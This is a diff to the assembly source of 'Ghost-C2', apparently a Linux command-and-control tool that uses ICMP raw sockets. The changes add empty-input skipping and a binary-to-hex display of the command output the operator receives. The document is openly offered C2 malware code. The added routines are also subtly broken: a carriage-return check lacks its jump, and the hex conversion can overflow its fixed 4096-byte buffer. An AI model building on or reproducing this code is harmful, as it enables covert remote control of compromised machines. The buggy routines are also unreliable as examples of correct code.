@@ -8,7 +8,7 @@
 ;     \|_______|\|__|\|__|\|_______|\_________\   \|__|       \|______\|_________|
 ;                                  \|_________|                                   
 ; ===================================================================================
-; Project      : Ghost-C2 (v3.6.3) - "The Dual-Channel Hybrid Phantom"
+; Project      : Ghost-C2 (v3.6.3-1) - "The Dual-Channel Hybrid Phantom"
 ; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
 ; Architecture : x86_64 Linux (Pure Assembly, Libc-free)
 ; -----------------------------------------------------------------------------------
@@ -30,6 +30,8 @@
 
 
 section .bss
+	;binary check
+	hex_buffer resb 4096
 	
 	;related to chuck
 	chunk_size resb 1
@@ -167,6 +169,8 @@ section .data
 	b32_alpha:    db 'abcdefghijklmnopqrstuvwxyz234567'
 	b32_char_cnt: db 0, 2, 4, 5, 7, 8
 	
+	;Binary check related
+	hex_table: db "0123456789abcdef"
 	
 section .text
 global _start
@@ -368,6 +372,11 @@ _get_command:
     mov rdx, 56
     syscall
     
+    ; Skip empty input (0 bytes or just newline)
+    test rax, rax
+    jz _get_command
+    cmp rax, 1
+    je _get_command
     mov [cmd_len], al      ; Saving AL
     dec rax
     mov byte [payload + rax], 0 ; Null terminate
@@ -512,27 +521,43 @@ _handle_incoming_data:
     ret
 
 _process_output:
-    ; Decompression (Sıkıştırılmış veriyi çözme)
     lea rsi, [full_compressed]
     lea rdi, [full_decompressed]
     mov rcx, [total_received]
-    call _vesqer_decompress     
-    
-    ; Çıktıyı Ekrana Yazdır
-    mov rdx, rax                ; RAX = Çözülen verinin gerçek boyutu
-    mov rax, 1                  ; sys_write
-    mov rdi, 1                  ; stdout
+    call _vesqer_decompress
+    mov r14, rax                ; size'ı sakla
+
+    ; Binary check
     lea rsi, [full_decompressed]
+    mov rcx, r14
+    call _is_binary
+    test rax, rax
+    jz .write_direct
+
+    ; Binary → hex çevir
+    lea rsi, [full_decompressed]
+    mov rcx, r14
+    lea rdi, [hex_buffer]
+    call _to_hex
+    mov r14, rax
+    lea rsi, [hex_buffer]
+    jmp .write
+
+.write_direct:
+    lea rsi, [full_decompressed]
+
+.write:
+    mov rdx, r14
+    mov rax, 1
+    mov rdi, 1
     syscall
 
-    ; Alt satıra geç (Format düzgünlüğü için)
     mov rax, 1
     mov rdi, 1
     lea rsi, [newline]
     mov rdx, 1
     syscall
-
-    jmp _get_command          ; Yeni komut almak için başa dön
+    jmp _get_command
 
 ; ====================================================================
 ;  GHOST-C2 PROTOCOL MODULE: ICMP (Modular)
@@ -1101,8 +1126,84 @@ _master_switch_to_icmp:
     ; 5. Yeni ICMP Raw Soketini başlat
     call [rbp - 0x08]
     
-    ; 6. Raw Soket dinlemeye başladığı için direkt pusuya yat
+    ; 6. Raw Soket dinlemeye başladığı için direkt sniff
     jmp _get_command
+
+_is_binary:
+    xor rax, rax
+.loop:
+    test rcx, rcx
+    jz .done
+    movzx rdx, byte [rsi]
+    cmp dl, 0x09        ; tab
+    je .ok
+    cmp dl, 0x0A        ; newline
+    je .ok
+    cmp dl, 0x0D        ; CR
+    cmp dl, 0x1B        ; ESC (ANSI color sequences)
+    je .ok
+    je .ok
+    cmp dl, 0x20        ; space
+    jb .found           ; < 0x20 → binary
+    cmp dl, 0x7E        ; ~
+    ja .found           ; > 0x7E → binary
+.ok:
+    inc rsi
+    dec rcx
+    jmp .loop
+.found:
+    mov rax, 1          ; binary flag
+.done:
+    ret
+
+_to_hex:
+    ; rsi = input buffer
+    ; rcx = input size
+    ; rdi = output buffer
+    ; rax = output size (return)
+    push rbx
+    push r12
+    push r13
+
+    lea rbx, [rel hex_table]
+    xor rax, rax
+
+.loop:
+    test rcx, rcx
+    jz .done
+
+    movzx r12, byte [rsi]
+    inc rsi
+    dec rcx
+
+    ; high nibble
+    mov r13, r12
+    shr r13, 4
+    movzx r13, byte [rbx + r13]
+    mov byte [rdi], r13b
+    inc rdi
+    inc rax
+
+    ; low nibble
+    mov r13, r12
+    and r13, 0x0F
+    movzx r13, byte [rbx + r13]
+    mov byte [rdi], r13b
+    inc rdi
+    inc rax
+
+    ; space separator
+    mov byte [rdi], 0x20
+    inc rdi
+    inc rax
+
+    jmp .loop
+
+.done:
+    pop r13
+    pop r12
+    pop rbx
+    ret
 
 _exit:
     mov rax, 60
